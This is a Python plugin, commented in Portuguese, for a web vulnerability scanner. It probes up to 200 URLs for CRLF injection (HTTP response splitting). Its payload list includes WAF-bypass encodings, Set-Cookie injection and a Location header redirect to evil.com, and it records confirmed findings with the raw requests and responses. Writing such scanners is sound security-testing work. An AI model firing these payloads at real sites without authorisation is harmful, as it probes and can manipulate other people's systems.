#!/usr/bin/env python3
"""
CRLF Injection Scanner — Detecta HTTP Response Splitting.

Testa injeção de CRLF (\r\n) em URLs para verificar se headers
arbitrários podem ser injetados na resposta HTTP.

Validação rigorosa:
  - Injeta header customizado (X-CRLF-Test: enum-allma)
  - Verifica se o header aparece na resposta HTTP real
  - Testa múltiplas codificações de CRLF para bypass de WAFs
  - Compara com baseline para eliminar falsos positivos
"""
import json
import re
from pathlib import Path
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

from menu import C
from plugins import ensure_outdir
from plugins.validation import finding
from ..output import info, success, warn, error
from ..http_utils import format_http_request, format_http_response

# ============================================================
# PAYLOADS CRLF
# ============================================================
CRLF_MARKER_HEADER = "X-CRLF-Test"
CRLF_MARKER_VALUE = "enum-allma-confirmed"

# Cada payload tenta injetar o header X-CRLF-Test: enum-allma-confirmed
CRLF_PAYLOADS = [
    # Standard CRLF
    {
        "suffix": f"%0d%0a{CRLF_MARKER_HEADER}:%20{CRLF_MARKER_VALUE}",
        "label": "Standard %0d%0a",
    },
    # Double encoding
    {
        "suffix": f"%250d%250a{CRLF_MARKER_HEADER}:%20{CRLF_MARKER_VALUE}",
        "label": "Double encode %250d%250a",
    },
    # Unicode variants
    {
        "suffix": f"%0D%0A{CRLF_MARKER_HEADER}:%20{CRLF_MARKER_VALUE}",
        "label": "Uppercase %0D%0A",
    },
    # Only LF
    {
        "suffix": f"%0a{CRLF_MARKER_HEADER}:%20{CRLF_MARKER_VALUE}",
        "label": "LF only %0a",
    },
    # Only CR
    {
        "suffix": f"%0d{CRLF_MARKER_HEADER}:%20{CRLF_MARKER_VALUE}",
        "label": "CR only %0d",
    },
    # UTF-8 line separator
    {
        "suffix": f"%e5%98%8a%e5%98%8d{CRLF_MARKER_HEADER}:%20{CRLF_MARKER_VALUE}",
        "label": "UTF-8 line separator",
    },
    # CRLF + Set-Cookie injection
    {
        "suffix": f"%0d%0aSet-Cookie:%20crlf=injected",
        "label": "Set-Cookie injection",
        "check_cookie": True,
    },
    # CRLF + Location header (open redirect via header injection)
    {
        "suffix": "%0d%0aLocation:%20https://evil.com",
        "label": "Location header injection",
        "check_location": True,
    },
    # Null byte + CRLF
    {
        "suffix": f"%00%0d%0a{CRLF_MARKER_HEADER}:%20{CRLF_MARKER_VALUE}",
        "label": "Null byte + CRLF",
    },
    # Tab + CRLF
    {
        "suffix": f"%09%0d%0a{CRLF_MARKER_HEADER}:%20{CRLF_MARKER_VALUE}",
        "label": "Tab + CRLF",
    },
]


def check_crlf(url: str) -> list:
    """Testa CRLF injection em uma URL."""
    import httpx
    from core.config import DEFAULT_USER_AGENT

    findings_list = []
    parsed = urlparse(url)

    try:
        with httpx.Client(
            timeout=10, verify=False, follow_redirects=False
        ) as client:
            headers = {"User-Agent": DEFAULT_USER_AGENT}

            for payload_info in CRLF_PAYLOADS:
                suffix = payload_info["suffix"]
                label = payload_info["label"]
                check_cookie = payload_info.get("check_cookie", False)
                check_location = payload_info.get("check_location", False)

                # Injetar no PATH
                test_url = f"{url}{suffix}"

                try:
                    resp = client.get(test_url, headers=headers)

                    confirmed = False
                    evidence_detail = ""

                    # Check 1: Nosso header customizado aparece nos headers da resposta?
                    if CRLF_MARKER_HEADER.lower() in {
                        k.lower() for k in resp.headers.keys()
                    }:
                        marker_val = resp.headers.get(CRLF_MARKER_HEADER, "")
                        if CRLF_MARKER_VALUE in marker_val:
                            confirmed = True
                            evidence_detail = f"Header {CRLF_MARKER_HEADER}: {marker_val} injetado com sucesso"

                    # Check 2: Set-Cookie injection?
                    if check_cookie and not confirmed:
                        for cookie_header in resp.headers.get_list("set-cookie"):
                            if "crlf=injected" in cookie_header:
                                confirmed = True
                                evidence_detail = f"Cookie injetado: {cookie_header}"
                                break

                    # Check 3: Location header injection?
                    if check_location and not confirmed:
                        # Bug 1 Fix: Strict check for CRLF in Location header.
                        # We must verify if \r\n was actually injected (reflected raw) OR if it caused a header split.
                        location = resp.headers.get("location", "")
                        raw_headers_str = ""
                        try:
                            raw_headers_str = "\r\n".join([f"{k}: {v}" for k, v in resp.headers.items()])
                        except Exception:
                            pass
                            
                        # If the payload contains evil.com, we check if it split the header OR was reflected literally with \r\n
                        if ("evil.com" in location and not location.startswith("https://evil.com")) and ("\r\n" in raw_headers_str or "Location: https://evil.com" in raw_headers_str):
                            confirmed = True
                            evidence_detail = f"Location header injetado: {location}"

                    # Check 4: Header na resposta raw (fallback)
                    if not confirmed:
                        raw_resp = format_http_response(resp)
                        if CRLF_MARKER_VALUE in raw_resp:
                            confirmed = True
                            evidence_detail = f"Marker encontrado na resposta raw"

                    if confirmed:
                        findings_list.append({
                            "url": url,
                            "test_url": test_url,
                            "payload": suffix,
                            "technique": label,
                            "response_status": resp.status_code,
                            "evidence": evidence_detail,
                            "request_raw": format_http_request(resp.request),
                            "response_raw": format_http_response(resp),
                            "response_headers": dict(resp.headers),
                        })
                        # Um confirmed basta — não precisa testar mais payloads
                        break

                except Exception:
                    pass

                # Injetar em PARÂMETROS (se existirem)
                params = parse_qs(parsed.query, keep_blank_values=True)
                if params and not findings_list:
                    for param_name in list(params.keys())[:3]:
                        qs = dict(params)
                        qs[param_name] = [f"{params[param_name][0]}{suffix}"]
                        new_query = urlencode(qs, doseq=True)
                        param_url = urlunparse(parsed._replace(query=new_query))

                        try:
                            resp = client.get(param_url, headers=headers)

                            confirmed = False
                            evidence_detail = ""

                            if CRLF_MARKER_HEADER.lower() in {
                                k.lower() for k in resp.headers.keys()
                            }:
                                marker_val = resp.headers.get(CRLF_MARKER_HEADER, "")
                                if CRLF_MARKER_VALUE in marker_val:
                                    confirmed = True
                                    evidence_detail = (
                                        f"Header injetado via param '{param_name}'"
                                    )

                            if check_cookie and not confirmed:
                                for ch in resp.headers.get_list("set-cookie"):
                                    if "crlf=injected" in ch:
                                        confirmed = True
                                        evidence_detail = f"Cookie injetado via param '{param_name}'"
                                        break

                            if confirmed:
                                findings_list.append({
                                    "url": url,
                                    "test_url": param_url,
                                    "payload": suffix,
                                    "technique": f"{label} (param: {param_name})",
                                    "param": param_name,
                                    "response_status": resp.status_code,
                                    "evidence": evidence_detail,
                                    "request_raw": format_http_request(resp.request),
                                    "response_raw": format_http_response(resp),
                                    "response_headers": dict(resp.headers),
                                })
                                break
                        except Exception:
                            pass

                    if findings_list:
                        break  # Já achou em params, parar

    except Exception:
        pass

    return findings_list


def run(context: dict):
    """Executa CRLF Injection Scanner."""
    target = context.get("target")
    if not target:
        raise ValueError("Target required")

    info(
        f"\n📝───────────────────────────────────────────────────────────📝\n"
        f"   💉 {C.BOLD}{C.CYAN}CRLF INJECTION SCANNER{C.END}\n"
        f"   🎯 Alvo: {C.GREEN}{target}{C.END}\n"
        f"📝───────────────────────────────────────────────────────────📝\n"
    )

    outdir = ensure_outdir(target, "crlf")

    # Carregar URLs
    from core.url_sources import primary_urls_txt_for_scan
    urls_file = primary_urls_txt_for_scan(target)
    if not urls_file.exists():
        urls_file = Path("output") / target / "urls" / "urls_200.txt"
    if not urls_file.exists():
        urls_file = Path("output") / target / "domain" / "urls_valid.txt"
    if not urls_file.exists():
        warn("⚠️ Nenhuma URL válida encontrada.")
        (outdir / "findings.json").write_text("[]")
        return []

    all_urls = [l.strip() for l in urls_file.read_text().splitlines() if l.strip()]

    # Deduplicar por base URL (host + path, sem query params)
    seen = set()
    unique_urls = []
    for url in all_urls:
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        if base not in seen:
            seen.add(base)
            unique_urls.append(url)

    # Limitar
    if len(unique_urls) > 200:
        info(f"   ⚠️ Limitando de {len(unique_urls)} para 200 URLs únicas")
        unique_urls = unique_urls[:200]

    info(f"   📋 Testando CRLF em {len(unique_urls)} URLs únicas...")

    # Executar em paralelo
    all_findings = []
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(check_crlf, url): url for url in unique_urls}
        for future in as_completed(futures):
            try:
                results = future.result()
                if results:
                    all_findings.extend(results)
                    for f in results:
                        info(
                            f"   💉 {C.RED}CRLF CONFIRMED!{C.END} {f['url']} "
                            f"→ {f['technique']} | {f['evidence']}"
                        )
            except Exception:
                pass

    # Salvar raw
    raw_file = outdir / "crlf_results.json"
    raw_file.write_text(json.dumps(all_findings, indent=2, ensure_ascii=False))

    # Normalizar findings
    normalized = []
    for f in all_findings:
        normalized.append(
            finding(
                plugin="crlf",
                target=target,
                title=f"CRLF Injection: {f.get('technique', '')}",
                issue_type="CRLF_INJECTION",
                risk="HIGH",
                confidence="HIGH",
                description=(
                    f"CRLF injection confirmada em {f['url']}. "
                    f"Técnica: {f['technique']}. "
                    f"Evidência: {f['evidence']}"
                ),
                url=f.get("url", ""),
                detection={
                    "payload": f.get("payload"),
                    "technique": f.get("technique"),
                    "test_url": f.get("test_url"),  # Bug 9 Fix: Include test_url
                },
                validation={
                    "confirmed": True,
                    "response_status": f.get("response_status"),
                    "injected_headers": f.get("response_headers", {}),
                },
                evidence={
                    "request_raw": f.get("request_raw", ""),
                    "response_raw": f.get("response_raw", ""),
                    "observable_impact": f.get("evidence", ""),
                },
                metadata=f,
            )
        )

    (outdir / "findings.json").write_text(json.dumps(normalized, indent=2, ensure_ascii=False))

    # Resumo
    if all_findings:
        success(f"\n   💉 {C.RED}{len(all_findings)} CRLF INJECTIONS CONFIRMADAS!{C.END}")
        techniques = set(f.get("technique", "") for f in all_findings)
        for t in techniques:
            count = sum(1 for f in all_findings if f.get("technique") == t)
            info(f"   📊 {t}: {count}")
    else:
        info("   ✅ Nenhuma CRLF injection detectada.")

    success(f"   📂 Resultados salvos em {outdir}/")
    return normalized
